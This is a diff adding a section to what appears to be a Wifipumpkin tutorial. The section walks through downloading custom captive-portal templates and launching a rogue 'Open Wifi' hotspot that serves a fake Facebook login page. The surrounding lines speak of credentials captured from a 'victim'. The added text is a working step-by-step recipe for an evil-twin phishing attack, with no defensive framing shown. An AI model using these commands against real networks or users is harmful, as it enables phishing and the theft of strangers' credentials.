@@ -81,3 +81,29 @@ When the victim connects to our "Hotspot" wifi, he will be redirected to a login
 Credentials have been captured by Wifipumpkin and displayed in a table form.
 
 #### 5) Custom Captiveflask
+
+We can use another captive flask than the generic one from the previous attack. It allows us to generate custom templates for a captive flask to phish our targets.
+
+    show
+    use misc.extra_captiveflask
+    help
+    download
+
+After downloading it, list the custom templates, then use anyone you wish in the list
+
+    list
+    install example
+
+Then,
+
+    sudo python3 setup.py install
+
+Now make the attack, but this time, use our customized captive flask we have downloaded.
+
+    set interface wlan0
+    set ssid Open Wifi
+    set proxy captiveflask
+    set captiveflask.facebook true
+    ignore pydns_server
+    start
+
